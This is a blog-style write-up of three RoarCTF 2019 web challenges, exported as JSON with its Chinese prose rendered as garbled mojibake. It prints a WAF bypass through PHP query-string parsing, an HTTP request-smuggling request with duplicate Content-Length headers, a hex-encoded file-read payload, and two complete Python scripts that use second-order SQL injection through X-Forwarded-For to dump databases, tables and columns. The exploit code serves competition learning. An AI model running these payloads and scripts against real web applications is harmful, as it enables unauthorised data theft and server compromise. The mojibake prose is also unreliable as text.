{"title":"roarctf 2019","slug":"roarctf-2019","date":"2019-10-16T08:45:49.000Z","updated":"2019-11-06T13:13:29.498Z","comments":true,"path":"api/articles/roarctf-2019.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<h1 id=\"roarctf-2019\"><a href=\"#roarctf-2019\" class=\"headerlink\" title=\"roarctf 2019\"></a>roarctf 2019</h1><p>10/16/2019 4:45:49 PM </p>\n<h2 id=\"easy-java\"><a href=\"#easy-java\" class=\"headerlink\" title=\"easy_java\"></a>easy_java</h2><p>æ‹¿åˆ°é¢˜ç›®çœ‹åˆ°æ–‡ä»¶ä¸‹è½½çš„æ¥å£ï¼Œå°è¯• <code>/Download?filename=help.docx</code> ,å‘ç°æ²¡æ³•ä¸‹è½½ï¼Œå°è¯•ä¸‹è½½ç½‘é¡µä¸Šçš„ç…§ç‰‡å‘ç°ä¹Ÿä¸‹è½½ä¸äº†ï¼Œåæ¥å°±è·‘åäº†ï¼Œåœ¨æƒ³ä¼šä¸ä¼šæ˜¯ <code>SSTI</code> ?fuzzäº†åŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°æ€è·¯.  ğŸ¨</p>\n<p>æ”¹å˜è¯·æ±‚æ–¹å¼ä¸º <code>post</code> å³å¯æˆåŠŸä¸‹è½½åˆ° <code>help.docx</code> ,é‡Œè¾¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚ </p>\n<p>éšä¾¿ä¸‹è½½ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œå¾—åˆ°æŠ¥é”™ä¿¡æ¯é‡Œæœ‰æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯ã€‚åšçš„æ—¶å€™å°±è¢«éš¾åˆ°çš„åœ°æ–¹å°±æ˜¯æ–‡ä»¶ä¸‹è½½ä¸çŸ¥é“ä¸‹è½½ä»€ä¹ˆä¸œè¥¿ã€‚è®°å¾—ä¸Šæ¬¡ç¢°åˆ°è¿™ç§é¢˜çš„æ—¶å€™è¿˜æ˜¯ <code>SUCTF</code> è¯» <code>nginx</code> é…ç½®æ–‡ä»¶</p>\n<h3 id=\"ä»€ä¹ˆæ˜¯-WEB-INF\"><a href=\"#ä»€ä¹ˆæ˜¯-WEB-INF\" class=\"headerlink\" title=\"ä»€ä¹ˆæ˜¯ WEB-INF\"></a>ä»€ä¹ˆæ˜¯ WEB-INF</h3><blockquote>\n<p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚æ‰€è°“å®‰å…¨å°±æ˜¯å®¢æˆ·ç«¯æ— æ³•è®¿é—®ï¼Œåªæœ‰æœåŠ¡ç«¯å¯ä»¥è®¿é—®çš„ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p>\n</blockquote>\n<ol>\n<li><p>/WEB-INF/web.xml</p>\n<p> Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</p>\n</li>\n<li><p>/WEB-INF/classes/</p>\n<p> åŒ…å«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ï¼ˆæ˜¯è¯¥ç›®å½•ä¸èƒ½åŒ…å«åœ¨.jaræ–‡ä»¶ä¸­ï¼‰ã€‚</p>\n</li>\n</ol>\n<p>å…¶ä»–çš„é…ç½®æ–‡ä»¶ä»‹ç»çœ‹<a href=\"https://baike.baidu.com/item/web-inf\" title=\"è¿™é‡Œ\" target=\"_blank\" rel=\"noopener\">https://baike.baidu.com/item/web-inf</a></p>\n<p>äº‹å®ä¸Šå°±æ˜¯åœ¨xmlä¸­é…ç½®å¥½æ˜ å°„è·¯å¾„ç„¶åè¿›è¡Œå¯¹æŸäº›å«å—ä¿æŠ¤å†…å®¹æ–‡ä»¶çš„è®¿é—®ã€‚</p>\n<p>æˆ‘ä»¬è®¿é—® <code>WEB-INF/web.xml</code> å‘ç°æ“ä½œflagçš„å…³é”®é…ç½®</p>\n<p>æŒ‰ç…§æ˜ å°„å…³ç³»è®¿é—® <code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code> å³å¯å¾—åˆ°è§£å¯†çš„å­—ç¬¦ä¸²ï¼Œbase64è§£å¯†å³å¯</p>\n<h2 id=\"easy-calc\"><a href=\"#easy-calc\" class=\"headerlink\" title=\"easy_calc\"></a>easy_calc</h2><p>å³é”®æŸ¥çœ‹æºç </p>\n<pre><code>&lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;num&apos;])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET[&apos;num&apos;];\n        $blacklist = [&apos; &apos;, &apos;\\t&apos;, &apos;\\r&apos;, &apos;\\n&apos;,&apos;\\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\\[&apos;, &apos;\\]&apos;,&apos;\\$&apos;,&apos;\\\\&apos;,&apos;\\^&apos;];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) {\n                        die(&quot;what are you want to do?&quot;);\n                }\n        }\n        eval(&apos;echo &apos;.$str.&apos;;&apos;);\n}\n?&gt; </code></pre><p>æœ‰wafï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ç»•è¿‡ï¼š</p>\n<ol>\n<li>åˆ©ç”¨å­—ç¬¦ä¸²è§£æç‰¹æ€§ Bypass</li>\n</ol>\n<p>åŸç†çœ‹è¿™ç¯‡æ–‡ç« ï¼š<br><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p>è¿™é‡Œè¯´ä¸€ä¸‹å¤§æ¦‚æ„æ€<br> PHP å¤„ç† GET or POST è¯·æ±‚æ—¶å°†æŸ¥è¯¢å­—ç¬¦ä¸²è½¬æ¢æˆæ•°ç»„ <code>/?foo=bar becomes Array([foo] =&gt; &quot;bar&quot;)</code> ã€‚å‚æ•°åé‡Œçš„ä¸€äº›å­—ç¬¦ä¼šè¢«ç§»é™¤æˆ–æ›¿æ¢æˆä¸‹åˆ’çº¿ <code>/?%20news[id%00=42 will be converted to Array([news_id] =&gt; 42)</code> å¦‚æœWAFè§„åˆ™æ˜¯å‚æ•°é‡Œå«æœ‰ä¸€ä¸ªéæ•°å€¼å‹çš„å€¼æ—¶è¿›è¡Œæ‹¦æˆªæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ä¸‹åˆ—è¯­å¥ç»•è¿‡<code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code> å®ƒä¼šè¢«å­˜å‚¨åœ¨ <code>$_GET[&quot;news_id&quot;]</code> ã€‚</p>\n<p>è¿™æ˜¯æµ‹è¯•phpæ˜¯å¦‚ä½•å¤„ç†ç‰¹æ®Šå­—ç¬¦ï¼š</p>\n<pre><code>&lt;?php\nforeach(\n    [\n        &quot;{chr}foo_bar&quot;,\n        &quot;foo{chr}bar&quot;,\n        &quot;foo_bar{chr}&quot;\n    ] as $k =&gt; $arg) {\n    for($i=0;$i&lt;=255;$i++) {\n        echo &quot;\\033[999D\\033[K\\r&quot;;\n        echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;&quot;;\n        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg).&quot;=bla&quot;,$o);\n        /* yes... I&apos;ve added a sleep time on each loop just for\n        the scenic effect :)\nlike that movie with unrealistic\n        brute-force where the password are obtained\n        one byte at a time (âˆ©ï½€-Â´)âŠƒâ”â˜†ï¾Ÿ.*ï½¥ï½¡ï¾Ÿ\n        */\n        usleep(5000);\n        if(isset($o[&quot;foo_bar&quot;])) {\n            echo &quot;\\033[999D\\033[K\\r&quot;;\n            echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\\n&quot;;\n        }\n    }\n    echo &quot;\\033[999D\\033[K\\r&quot;;\n    echo &quot;\\n&quot;;\n}</code></pre><p>è¿™é“é¢˜ç›®ç»è¿‡æµ‹è¯•å‚æ•°å‰åŠ ä¸€ä¸ª <code>%20</code>æˆ–è€… <code>+</code> æ¥ç»•è¿‡</p>\n<ol start=\"2\">\n<li>httpåè®®èµ°ç§æ”»å‡»</li>\n</ol>\n<blockquote>\n<p>å½“æˆ‘ä»¬å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„HTTPè¯·æ±‚æ—¶ï¼Œç”±äºä¸¤è€…æœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†ï¼Œå°±ç®—æ˜¯èµ°ç§çš„è¯·æ±‚ï¼Œå½“è¯¥éƒ¨åˆ†å¯¹æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚é€ æˆäº†å½±å“ä¹‹åï¼Œå°±å®ç°äº†HTTPèµ°ç§æ”»å‡»ã€‚</p>\n</blockquote>\n<p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡ CL-CL æ¥Bypass</p>\n<pre><code>POST /calc.php?num=phpinfo() HTTP/1.1\nHost: ********\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: keep-alive\nReferer: **********\nCookie: __cfduid=***********\nX-Forwarded-For: 127.0.0.1\nContent-Length: 7\nContent-Length: 7\nContent-Type: application/x-www-form-urlencoded\n\nnum=111</code></pre><p>ç»•è¿‡wafä¹‹åè¿˜ç¦æ‰äº†ä¸€äº›å­—ç¬¦ä¸èƒ½ç›´æ¥è¯»åˆ° flag ã€‚</p>\n<p>å…ˆå­¦ä¹ å‡ ä¸ªå‡½æ•°</p>\n<ul>\n<li>ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</li>\n<li>bin2hex â€” å‡½æ•°æŠŠåŒ…å«æ•°æ®çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶å€¼</li>\n<li>hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li>\n<li>dechex â€” åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶</li>\n<li>base_convert â€” åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</li>\n<li>hexdec â€” åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶</li>\n</ul>\n<p>è¯»å–flag</p>\n<pre><code>?+num=file_get_contents(hex2bin(dechex(52115961636711)))</code></pre><h2 id=\"Online-Proxy\"><a href=\"#Online-Proxy\" class=\"headerlink\" title=\"Online Proxy\"></a>Online Proxy</h2><p>æ‰“å¼€é¶æœºï¼ŒæŠ“åŒ…å‘ç°å“åº”å¤´</p>\n<pre><code>&lt;!-- Debug Info: \n Duration: 0.058279037475586 s \n Current Ip: 127.0.0.1 </code></pre><p>åœ¨ XFF å¤„å°è¯•ä¿®æ”¹å†…å®¹ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹æˆåŠŸã€‚<code>Current Ip</code> å¤„æ˜¾ç¤ºå½“å‰çš„ XFFå€¼ï¼Œ<code>Last Ip</code> æ˜¾ç¤ºä¸Šæ¬¡æŸ¥è¯¢å†…å®¹ã€‚æ‰§è¡Œ sleep() è¯­å¥ <code>1&#39; and sleep(3) and 1=&#39;1</code> å‘ç°åœ¨ç¬¬äºŒæ¬¡è¿›è¡Œä¿®æ”¹å‘åŒ…ä¹‹åæˆåŠŸæ‰§è¡Œï¼Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p>\n<p>æ‰€è°“äºŒæ¬¡æ³¨å…¥å°±æ˜¯æœåŠ¡ç«¯åœ¨ç¬¬ä¸€æ¬¡æ¥æ”¶è„æ•°æ®æ—¶å¯¹æ•°æ®è¿›è¡Œäº† <code>addslashes</code> æˆ– <code>mysql_escape_string</code>  å¤„ç†ï¼Œä½†æ˜¯å­˜å…¥æ•°æ®åº“æ—¶å­˜çš„è¿˜æ˜¯è„æ•°æ®ï¼Œäºæ˜¯åœ¨ç¬¬äºŒæ¬¡æŸ¥è¯¢æ—¶ç”±äºæŸ¥è¯¢çš„æ˜¯è„æ•°æ®ï¼Œä¿¡æ¯ä»ç„¶ä¼šæ³„éœ²ã€‚</p>\n<p>æŸ¥çœ‹æºç ï¼š</p>\n<pre><code>header(&quot;Content-type: &quot;. $mime_type.&quot;; charset=UTF-8&quot;);\n$content = str_replace(&quot;&lt;a href=\\&quot;&quot;, &quot;&lt;a href=\\&quot;/?url=&quot;, $content);\n$content = str_replace(&quot;&lt;a href=&apos;&quot;, &quot;&lt;a href=&apos;/?url=&quot;, $content);\necho($content);\n$end = microtime(true);\n$time = $end - $start;\n$last_ip = &quot;&quot;;\n$result = query(&quot;select current_ip, last_ip from ip_log where uuid = &apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\nif(count($result) &gt; 0) {\n    if($ip !== $result[0][&apos;current_ip&apos;]) {\n        $last_ip = $result[0][&apos;current_ip&apos;];\n        query(&quot;delete from ip_log where uuid=&apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\n    } else {\n        $last_ip = $result[0][&apos;last_ip&apos;];\n    }\n}\nquery(&quot;insert into ip_log values (&apos;&quot;.addslashes($uuid).&quot;&apos;, &apos;&quot;.addslashes($ip).&quot;&apos;, &apos;$last_ip&apos;);&quot;);\ndie(&quot;\\n&lt;!-- Debug Info: \\n Duration: $time s \\n Current Ip: $ip &quot;.($last_ip !== &quot;&quot; ? &quot;\\nLast Ip: &quot;.$last_ip : &quot;&quot;).&quot; --&gt;&quot;);</code></pre><p>å¯ä»¥çœ‹åˆ°åœ¨æŸ¥è¯¢åˆ°æ•°æ®ä¹‹åï¼Œå¦‚æœ <code>$ip !== $result[0][&#39;current_ip&#39;]</code> é‚£ä¹ˆ <code>$last_ip = $result[0][&#39;current_ip&#39;];</code> ï¼Œéšåå°† last_ip ä¸å¸¦è¿‡æ»¤çš„å¸¦å…¥æ•°æ®åº“ä¸­æŸ¥è¯¢ã€‚</p>\n<p>æ‰€ä»¥æˆ‘ä»¬æ³¨å…¥çš„æ€è·¯å°±æ˜¯å…ˆå°† exp æ’å…¥æ•°æ®ï¼Œç„¶åå†æ­£å¸¸è®¿é—®ä¸€æ¬¡å°†æ•°æ®å¸¦å‡ºã€‚</p>\n<p>exp:</p>\n<pre><code>import requests\nfrom time import sleep\nurl = &quot;http://node3.buuoj.cn:28063/&quot;\ns = requests.session()\n\nre = s.get(url)\nname = &apos;&apos;\n&quot;&quot;&quot;\n# database name\n# current db : ctf\n# information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# table name\n# ctf : ip_log\n# F4l9_D4t4B45e : F4l9_t4b1e\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;F4l9_D4t4B45e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# column_name\n# F4l9_D4t4B45e.F4l9_t4b1e : F4l9_C01uMn\nfor i in range(1,20):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&apos;F4l9_D4t4B45e&apos;and table_name=&apos;F4l9_t4b1e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break</code></pre><p>è¿™ä¸ªå¤ªä¸ä¼˜é›…äº†ï¼Œèµµå¸ˆå‚…çš„æ›´ä¼˜é›…ï¼š</p>\n<pre><code>#!/usr/bin/env python3\n\nimport requests\n\ntarget = &quot;http://localhost:8302/&quot;\n\ndef execute_sql(sql):\n    print(&quot;[*]è¯·æ±‚è¯­å¥ï¼š&quot; + sql)\n    return_result = &quot;&quot;\n\n    payload = &quot;0&apos;|length((&quot; + sql + &quot;))|&apos;0&quot;\n    session = requests.session()\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    start_pos = r.text.find(&quot;Last Ip: &quot;)\n    end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n    length = int(r.text[start_pos + 9: end_pos])\n    print(&quot;[+]é•¿åº¦ï¼š&quot; + str(length))\n\n    for i in range(1, length + 1, 5):\n        payload = &quot;0&apos;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&apos;0&quot;\n\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        start_pos = r.text.find(&quot;Last Ip: &quot;)\n        end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n        result = int(r.text[start_pos + 9: end_pos])\n        return_result += bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;)\n\n        print(&quot;[+]ä½ç½® &quot; + str(i) + &quot; è¯·æ±‚äº”ä½æˆåŠŸ:&quot; + bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;))\n\n    return return_result\n\n\n# è·å–æ•°æ®åº“\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))\n\n# è·å–æ•°æ®åº“è¡¨\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos;&quot;))\n\n# è·å–æ•°æ®åº“è¡¨\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos; AND TABLE_NAME = &apos;F4l9_t4b1e&apos; &quot;))\n\n# è·å–è¡¨ä¸­å†…å®¹\nprint(&quot;[+]è·å–æˆåŠŸï¼š&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))</code></pre><p>è¿™é‡Œç”¨çš„æ˜¯ <code>1&#39;|&#39;1&#39;|&#39;1</code> ç„¶åå¼‚æˆ–ä¹Ÿå¯ä»¥ <code>1&#39;^&#39;0&#39;^&#39;1</code></p>\n<h2 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h2><blockquote>\n<p><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/213359.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/web/213359.html</a></p>\n<p><a href=\"https://paper.seebug.org/1048/#32-cl-cl\" target=\"_blank\" rel=\"noopener\">https://paper.seebug.org/1048/#32-cl-cl</a></p>\n</blockquote>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]}